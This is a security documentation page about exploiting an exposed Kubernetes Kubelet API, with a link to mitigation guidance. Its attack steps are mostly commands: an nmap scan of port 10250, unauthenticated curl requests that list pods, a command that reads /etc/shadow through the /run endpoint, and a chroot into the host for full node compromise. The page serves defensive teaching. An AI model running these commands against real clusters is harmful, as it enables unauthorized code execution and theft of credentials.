---
sidebar_position: 9
title: "Exposed Kubelet API"
description: "How an exposed Kubelet API can be exploited to execute commands on nodes and compromise Kubernetes clusters."
---

# Exposed Kubelet API

The **Kubelet API** is responsible for managing pods on each node in a Kubernetes cluster. If improperly secured, attackers can **execute commands on worker nodes, retrieve secrets, and gain full control over workloads**.

---

## Exploitation Steps: Gaining Access to the Kubelet API

An attacker scans the cluster network to identify an open **Kubelet API port (10250)**.

### Step 1: Scan for Open Ports

The attacker runs a network scan to discover exposed Kubelets:

```bash
nmap -p 10250 --open <cluster-ip-range>
```

### Step 2: Query the Kubelet API

If authentication is **not enforced**, the attacker lists running pods:

```bash
curl -k https://<kubelet-ip>:10250/pods
```

### Step 3: Execute Commands on a Node

If the Kubelet API allows unauthenticated execution, the attacker runs a command inside a pod:

```bash
curl -k -X POST "https://<kubelet-ip>:10250/run/<namespace>/<pod-name>/<container-name>" -d 'cmd=cat /etc/shadow'
```

### Step 4: Escalate Privileges

If the attacker gains access to a privileged container, they execute commands on the **host node**, leading to cluster-wide compromise:

```bash
curl -k -X POST "https://<kubelet-ip>:10250/run/default/root-container" -d 'cmd=chroot /host bash'
```

### Result

The attacker now has **remote code execution** on a Kubernetes worker node and can **compromise the entire cluster**.

---

## Mitigation Steps

To protect against **Kubelet API exposure**, follow the security best practices outlined in:

➡ **[Kubelet Security](/docs/best_practices/cluster_setup_and_hardening/node_security/kubelet_security)**

This guide covers techniques such as **disabling anonymous access, enforcing authentication, using RBAC to restrict API actions, and securing network access** to prevent unauthorized control over Kubelet APIs.
